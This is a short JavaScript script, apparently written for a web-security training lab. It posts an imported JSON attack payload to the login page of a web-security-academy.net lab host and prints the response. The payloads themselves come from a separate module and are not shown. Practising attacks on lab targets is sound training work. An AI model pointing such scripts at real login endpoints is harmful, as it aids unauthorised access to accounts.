import { Payload } from './payload/payload.js';
import axios from 'axios';

const attack = async () => {
    const url = 'https://0a0f001703b4109d80c63a8f0038008d.web-security-academy.net/login';
    // Send requests with payloads in JSON
    // const response = Payload.inJson.forEach((payload) => {
    //     sendRequest(url, payload);
    // });
    const response = await axios.post(url, Payload.inJson[0], {
        headers: {
            'Content-Type': 'application/json',
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            'User-Agent': 'Chrome/119.0.6045.159'
        }
    });
    return response;
};

console.log(await attack());
console.log(Payload.inJson[0]);